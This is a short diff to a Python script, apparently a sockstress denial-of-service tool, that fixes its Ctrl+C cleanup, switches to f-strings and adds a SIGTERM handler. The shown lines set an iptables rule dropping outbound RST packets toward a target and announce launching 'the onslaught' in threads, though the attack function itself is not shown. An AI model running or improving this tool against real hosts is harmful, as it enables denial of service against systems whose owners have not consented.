@@ -57,10 +57,10 @@ def sockstress(dstaddr: IPv4Address, dstport: int) -> None:
 
 
 ## Graceful shutdown allows IP Table Repair
-def graceful_shutdown(signal, frame):
+def graceful_shutdown(*_):
     print('\nYou pressed Ctrl+C!')
     print('Fixing IP Tables')
-    os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(options.target) + ' -j DROP')
+    os.system(f'iptables -D OUTPUT -p tcp --tcp-flags RST RST -d {options.target} -j DROP')
     sys.exit()
 
 
@@ -73,8 +73,9 @@ print("*******************************************************\n\n")
 options = commandline(sys.argv)
 
 ## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
-os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + str(options.target) + ' -j DROP')
+os.system(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {options.target} -j DROP')
 signal.signal(signal.SIGINT, graceful_shutdown)
+signal.signal(signal.SIGTERM, graceful_shutdown)
 
 ## Spin up multiple threads to launch the attack
 print("The onslaught has begun...use Ctrl+C to stop the attack")
